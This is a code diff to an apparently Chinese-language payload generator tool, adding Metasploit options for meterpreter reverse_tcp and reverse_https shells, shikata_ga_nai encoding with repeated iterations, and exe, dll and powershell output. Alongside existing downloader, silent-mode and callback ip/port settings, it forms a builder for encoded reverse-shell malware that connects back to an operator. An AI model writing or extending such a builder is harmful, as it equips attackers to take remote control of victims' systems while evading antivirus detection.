@@ -84,6 +84,56 @@ def interactive_mode():
         
         downloader_silent = input("下载器静默模式? (Y/n) >>> ").strip().lower() != 'n'
     
+    # 新增：MSF集成选项
+    use_msf = input("使用MSF(Metasploit)载荷? (y/N) >>> ").strip().lower() == 'y'
+    msf_payload = None
+    msf_encoder = None
+    msf_iterations = 1
+    msf_format = 'python'
+    
+    if use_msf:
+        # 检查MSF可用性
+        from .msf_integration import MSFIntegration
+        msf = MSFIntegration()
+        
+        if not msf.is_available():
+            print("⚠️ 警告: 未检测到MSF/msfvenom，将跳过MSF集成")
+            use_msf = False
+        else:
+            print("\n🎯 MSF载荷配置:")
+            print("推荐载荷类型:")
+            recommended = [
+                "1. python/meterpreter/reverse_tcp (推荐)",
+                "2. python/meterpreter/reverse_https", 
+                "3. windows/meterpreter/reverse_tcp",
+                "4. linux/x64/meterpreter/reverse_tcp"
+            ]
+            for rec in recommended:
+                print(f"   {rec}")
+            
+            # 载荷选择
+            msf_payload = input("MSF载荷类型 (默认: python/meterpreter/reverse_tcp) >>> ").strip()
+            if not msf_payload:
+                msf_payload = "python/meterpreter/reverse_tcp"
+            
+            # 编码器选择 
+            use_encoder = input("使用编码器? (Y/n) >>> ").strip().lower() != 'n'
+            if use_encoder:
+                print("推荐编码器: x86/shikata_ga_nai, base64, x64/zutto_dekiru")
+                msf_encoder = input("编码器 (默认: x86/shikata_ga_nai) >>> ").strip()
+                if not msf_encoder:
+                    msf_encoder = "x86/shikata_ga_nai"
+                
+                iterations_input = input("编码迭代次数 (默认: 3) >>> ").strip()
+                try:
+                    msf_iterations = int(iterations_input) if iterations_input else 3
+                except ValueError:
+                    msf_iterations = 3
+            
+            # 输出格式
+            print("输出格式: python (推荐), raw, exe, dll, powershell")
+            msf_format = input("MSF输出格式 (默认: python) >>> ").strip() or 'python'
+    
     return {
         'ip': ip,
         'port': port,
@@ -99,7 +149,12 @@ def interactive_mode():
         'white_black_mode': white_black_mode,
         'use_downloader': use_downloader,
         'download_url': download_url,
-        'downloader_silent': downloader_silent
+        'downloader_silent': downloader_silent,
+        'use_msf': use_msf,
+        'msf_payload': msf_payload,
+        'msf_encoder': msf_encoder,
+        'msf_iterations': msf_iterations,
+        'msf_format': msf_format
     }
 
 
@@ -122,6 +177,13 @@ def command_line_mode():
     parser.add_argument('--use-downloader', action='store_true', help='生成下载器模式')
     parser.add_argument('--download-url', help='下载地址 (主程序URL)')
     parser.add_argument('--downloader-silent', action='store_true', help='下载器静默模式')
+    parser.add_argument('--use-msf', action='store_true', help='使用MSF(Metasploit)载荷')
+    parser.add_argument('--msf-payload', default='python/meterpreter/reverse_tcp', 
+                       help='MSF载荷类型 (默认: python/meterpreter/reverse_tcp)')
+    parser.add_argument('--msf-encoder', help='MSF编码器 (如: x86/shikata_ga_nai)')
+    parser.add_argument('--msf-iterations', type=int, default=3, help='MSF编码迭代次数')
+    parser.add_argument('--msf-format', default='python', choices=['python', 'raw', 'exe', 'dll', 'powershell'],
+                       help='MSF输出格式')
     parser.add_argument('--quiet', action='store_true', help='静默模式')
     parser.add_argument('--silent-delay', default=30, type=int, help='静默延迟时间（秒），在执行危险操作前等待')
     
